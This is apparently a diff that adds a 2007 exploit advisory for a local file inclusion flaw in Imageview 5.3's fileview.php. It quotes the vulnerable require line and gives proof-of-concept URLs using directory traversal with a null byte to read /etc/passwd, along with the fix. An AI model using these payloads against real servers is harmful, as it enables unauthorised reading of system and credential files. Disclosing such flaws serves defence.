@@ -1,0 +1,26 @@
+                            \#'#/
+                            (-.-)
+   --------------------oOO---(_)---OOo-------------------
+   | Imageview v5.3 (fileview.php) Local File Inclusion |
+   |      (works only with magic_quotes_gpc = off)      |
+   |                    coded by DNX                    |
+   ------------------------------------------------------
+[!] Discovered: DNX
+[!] Vendor: www.blackdot.be/?inc=projects/imageview
+[!] Detected: 21.04.2007
+[!] Reported: 21.04.2007
+[!] Remote: yes
+
+[!] Background: Imageview is an image gallery script based on PHP
+
+[!] Bug: $_GET['album'] in fileview.php line 4
+
+         require('albums/'.$_GET['album'].'/data.dat');
+
+[!] PoC:
+    - http://[site]/[path]/fileview.php?album=[file]%00
+    - http://[site]/[path]/fileview.php?album=../../../../../../etc/passwd%00
+
+[!] Solution: Install Imageview 6 or magic_quotes_gpc = on
+
+# milw0rm.com [2007-04-29]
